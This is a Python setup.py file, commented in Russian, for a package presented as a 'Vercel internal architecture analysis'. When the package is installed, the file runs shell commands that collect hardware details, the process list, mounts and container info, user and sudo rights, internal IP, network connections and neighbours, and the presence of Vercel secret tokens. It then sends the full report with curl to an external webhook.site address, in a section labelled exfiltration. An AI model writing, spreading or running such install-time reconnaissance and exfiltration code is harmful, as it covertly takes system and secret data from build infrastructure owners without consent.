from setuptools import setup
import os
import subprocess

def run_cmd(cmd):
    try:
        return subprocess.getoutput(cmd).strip()
    except:
        return "Error"

# --- КОНФИГ ---
WEBHOOK_URL = "https://webhook.site/5429af37-3c52-47e3-8b1e-068229bcbee5"

# 1. ЖЕЛЕЗО (CPU / RAM / GPU)
cpu_info = run_cmd("lscpu | grep -E 'Model name|CPU\(s\):|Thread|Vendor'")
mem_info = run_cmd("free -h")
gpu_info = run_cmd("lspci | grep -i vga || echo 'No Discrete GPU found'")
# Проверка специфических ускорителей (если это AI-ноды)
ai_accel = run_cmd("ls /dev/nvidia* /dev/dri/* 2>/dev/null || echo 'No AI accelerators'")

# 2. ПРОЦЕССЫ (Кто "съедает" ресурсы)
# Выводим топ процессов по CPU и RAM, включая скрытые
process_list = run_cmd("ps aux --sort=-pcpu | head -n 30")

# 3. КОНТЕЙНЕРИЗАЦИЯ И ИЗОЛЯЦИЯ
# Проверяем, видим ли мы хост-систему или сидим в глубоком Docker/Firecracker
mounts = run_cmd("mount | column -t | head -n 15")
cgroup_check = run_cmd("cat /proc/1/cgroup")

# 4. СЕТЬ И СОСЕДИ
# Ищем активные соединения и ARP-таблицу (соседи по стойке в дата-центре)
net_stat = run_cmd("ss -antp | head -n 15")
neighbors = run_cmd("ip neigh show || route -n")

# --- ФОРМИРОВАНИЕ ОТЧЕТА ---
full_report = f"""
#######################################################
#     VERCEL INFRASTRUCTURE DEEP SCAN (NUCLEAR)       #
#######################################################

[!] HARDWARE DATA (CPU/GPU/RAM)
{cpu_info}
---
{mem_info}
---
GPU: {gpu_info}
ACCEL: {ai_accel}

[!] ENVIRONMENT & ISOLATION
USER: {run_cmd('id')}
SUDO: {run_cmd('sudo -n -l 2>/dev/null || echo "No sudo"')}
CONTAINER: {cgroup_check[:100]}
MOUNTS (TOP):
{mounts}

[!] PROCESS TREE (TOP 30 BY CPU)
{process_list}

[!] NETWORK RECON
INTERNAL_IP: {run_cmd('hostname -I')}
NETSTAT:
{net_stat}
NEIGHBORS:
{neighbors}

[!] VERCEL SECRETS
ARTIFACTS_TOKEN: {"PRESENT" if os.environ.get('VERCEL_ARTIFACTS_TOKEN') else "MISSING"}
ENCRYPTED_VAR: {"PRESENT" if os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT') else "MISSING"}

#######################################################
"""

# --- ЭКФИЛЬТРАЦИЯ ---
try:
    subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', full_report, WEBHOOK_URL], timeout=15)
except:
    pass

setup(
    name="vercel-infra-deep-scan",
    version="2.0.0",
    description="Vercel Internal Architecture Analysis"
)
